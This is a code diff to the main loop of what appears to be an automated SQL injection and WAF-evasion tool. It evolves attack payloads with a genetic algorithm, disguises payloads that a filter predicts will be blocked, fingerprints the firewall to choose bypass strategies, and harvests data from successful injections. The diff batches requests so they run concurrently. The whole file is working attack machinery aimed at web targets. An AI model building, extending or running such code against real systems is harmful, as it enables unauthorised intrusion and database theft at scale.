@@ -261,124 +261,82 @@ class IslandManager:
         if mutation_intensity >= 3:
             self.client.log(f"  [!] Island {island['id']} Chaos: Intensity {mutation_intensity} | Diversity: {diversity_ratio:.2f}")
 
+        # Prepare Payloads (including predictive blocking and camouflage)
+        ready_to_test = []
         for i, genome in enumerate(pop):
             payload_str = genome.render()
-            if payload_str in self.hall_of_fame: continue
-            
-            # 0. Avoid repeating successful payloads in the same session
-            if payload_str in self.session_tested:
+            if payload_str in self.hall_of_fame or payload_str in self.session_tested:
                 continue
-
-            # 1. Predictive Blocking (The Intelligent Filter)
-            # If severely stagnated, ignore predictive blocker occasionally to force exploration against real WAF
-            ignore_blocker = (island["stagnation"] >= 5 and random.random() < 0.3)
             
+            ignore_blocker = (island["stagnation"] >= 5 and random.random() < 0.3)
             if not ignore_blocker:
                 risk_score, matched_patterns = self.blocker.should_block(payload_str)
                 if risk_score > 0:
-                    self.client.log(f"  [Island {island['id']}] {i+1}/{len(pop)}: [RISKY] {risk_score} patterns detected. Applying Active Camouflage...")
-                    # Point 5: Instead of avoiding, we increase camouflage
                     payload_str = mutator.camouflage_payload(payload_str, matched_patterns)
-                    # We might want to re-validate if it's still "too" risky, or just send it
-                    # Here we just proceed with the camouflaged version
+            
+            ready_to_test.append((genome, payload_str))
 
-            self.client.log(f"  [Island {island['id']}] {i+1}/{len(pop)}: Testing {payload_str[:40]}...", type="attack")
-            try:
-                response = await self.client.send_request(payload_str)
-            except Exception as e:
-                self.client.log(f"  [Island {island['id']}] Request FAILED: {e}", type="error")
-                continue
+        # Batch Processing
+        batch_size = 4 # Process 4 concurrent requests per island
+        for i in range(0, len(ready_to_test), batch_size):
+            batch = ready_to_test[i:i + batch_size]
+            tasks = []
+            for genome, p_str in batch:
+                self.client.log(f"  [Island {island['id']}] Testing {p_str[:40]}...", type="attack")
+                tasks.append(self.client.send_request(p_str))
             
-            print(f"  [Island {island['id']}] Response received (Status: {response['status']})", flush=True)
+            responses = await asyncio.gather(*tasks, return_exceptions=True)
             
-            # 1.1 WAF Fingerprinting (First Request of the generation or if unknown)
-            if i == 0:
+            for (genome, p_str), response in zip(batch, responses):
+                if isinstance(response, Exception):
+                    self.client.log(f"  [Island {island['id']}] Request FAILED: {response}", type="error")
+                    continue
+                
+                # Check Fingerprint (on first success or if unknown)
                 waf = self.fingerprinter.identify(response['headers'], response['text'])
                 if waf != "GENERIC / UNKNOWN":
-                    self.client.log(f"[*] WAF DETECTED: {waf}", type="system")
-                    strategy = self.fingerprinter.get_bypass_strategy(waf)
-                    mutator.apply_hint({"suggestion": strategy["hint"], "weights": strategy["weights"]})
+                    mutator.apply_hint({"suggestion": self.fingerprinter.get_bypass_strategy(waf)["hint"], "weights": self.fingerprinter.get_bypass_strategy(waf)["weights"]})
 
-            # Point 6: Generate State Vector (Now 11 dimensions)
-            state_vec = self.validator.get_state_vector(
-                response['text'], 
-                response['status'], 
-                response.get('latency', 0), 
-                self.baseline,
-                depth=genome.depth,
-                consecutive_fails=island['stagnation']
-            )
-            
-            score, status = self.validator.validate(response['text'], response['status'], payload=payload_str, latency=response.get('latency', 0), baseline=self.baseline)
-            
-            # Point 4: Side-Channel Reward (Latency Penalty/Reward)
-            # If latency is very high but it's a 200, maybe it's Deep Inspection (WAF stress).
-            latency = response.get('latency', 0)
-            if latency > 3000 and status == "INCONCLUSIVE":
-                score += 0.1 # Information gain from side-channel
-            
-            # 1.2 Combat Genetic Drift
-            if status == "WAF_BYPASSED_PARTIAL" and any("WAF_BYPASSED_PARTIAL" in n for n in self.discovered_niches):
-                score *= 0.5 
-                status = "LOCAL_OPTIMA_PENALIZED"
+                # Validate & Score
+                state_vec = self.validator.get_state_vector(response['text'], response['status'], response.get('latency', 0), self.baseline, depth=genome.depth, consecutive_fails=island['stagnation'])
+                score, status = self.validator.validate(response['text'], response['status'], payload=p_str, latency=response.get('latency', 0), baseline=self.baseline)
+                
+                latency = response.get('latency', 0)
+                if latency > 3000 and status == "INCONCLUSIVE": score += 0.1
+                
+                if score <= 0.1:
+                    self.blocker.learn_from_block(p_str)
+                    self.blocked_buffer.append(p_str)
+                    if self.semantic_memory: self.semantic_memory.learn_blocked_pattern(p_str)
+                elif score >= 0.8:
+                    self.blocker.report_success(p_str)
 
-            if score <= 0.1:
-                self.blocker.learn_from_block(payload_str)
-                self.blocked_buffer.append(payload_str)
-                if self.semantic_memory:
-                    self.semantic_memory.learn_blocked_pattern(payload_str)
-            elif score >= 0.8:
-                self.blocker.report_success(payload_str)
-
-            # 3. SQL Error Refinement (Implicitly handled by AST mutations in next gen)
-            error_msg = self.validator.get_sql_error(response['text'])
-            
-            # Similarity Penalty
-            for successful_p in self.hall_of_fame:
-                if self._calculate_similarity(payload_str, successful_p) > 0.8:
-                    score *= 0.5
-                    status = f"BIASED_{status}"
-                    break
-
-            # 3.5 Identify Blocking Reason (Understanding 'Why')
-            # Check if this specific block matches any of our inferred rules
-            block_reason = None
-            if score <= 0.1:
-                block_reason = self.inferrer.get_blocking_reason(payload_str)
-                if block_reason:
-                    self.client.log(f"  [WAF_REASON] Payload matched inferred rule: '{block_reason[0]['pattern']}'", type="waf_alert")
-
-            self.client.log({
-                "type": "attempt",
-                "island": island['id'],
-                "payload": payload_str,
-                "score": score,
-                "status": status,
-                "latency": latency,
-                "gen": gen_num
-            })
-            
-            self.session_tested.add(payload_str)
-            # Pass advanced metrics to RL reporter
-            mutator.report_success(payload_str, score, status=status, state_vector=state_vec, block_reason=block_reason)
-            self.exp_manager.save_attempt(payload_str, score, status, island_id=island['id'], generation_num=gen_num, error_msg=error_msg, target_name=self.target_name, parent_payload=genome.parent_payload)
-            scored_population.append((genome, score, error_msg))
-            
-            if score > max_score: max_score = score
-            
-            # Track discoveries
-            if score >= 0.3:
-                self.discovered_niches.add(f"{status}_{payload_str}")
+                error_msg = self.validator.get_sql_error(response['text'])
+                block_reason = self.inferrer.get_blocking_reason(p_str) if score <= 0.1 else None
+                
+                self.client.log({
+                    "type": "attempt",
+                    "island": island['id'],
+                    "payload": p_str,
+                    "score": score,
+                    "status": status,
+                    "latency": latency,
+                    "gen": gen_num
+                })
+                
+                mutator.report_success(p_str, score, status=status, state_vector=state_vec, block_reason=block_reason)
+                self.exp_manager.save_attempt(p_str, score, status, island_id=island['id'], generation_num=gen_num, error_msg=error_msg, target_name=self.target_name, parent_payload=genome.parent_payload)
+                scored_population.append((genome, score, error_msg))
+                
+                if score > max_score: max_score = score
                 if score >= 0.7:
-                    # 4. Data Extraction Report (New: Harvesting actual data from success)
                     harvested_data = self.extractor.extract(response['text'])
-                    if harvested_data:
-                        report = self.extractor.format_report(harvested_data)
-                        self.client.log(report, type="success")
-
-                    if payload_str not in self.hall_of_fame:
-                        self.hall_of_fame.append(payload_str)
-                        self.exp_manager.save_exploit(payload_str, status, target_name=self.target_name)
+                    if harvested_data: self.client.log(self.extractor.format_report(harvested_data), type="success")
+                    if p_str not in self.hall_of_fame:
+                        self.hall_of_fame.append(p_str)
+                        self.exp_manager.save_exploit(p_str, status, target_name=self.target_name)
+                
+                self.session_tested.add(p_str)
 
         # Next Gen for this island
         scored_population.sort(key=lambda x: x[1], reverse=True)
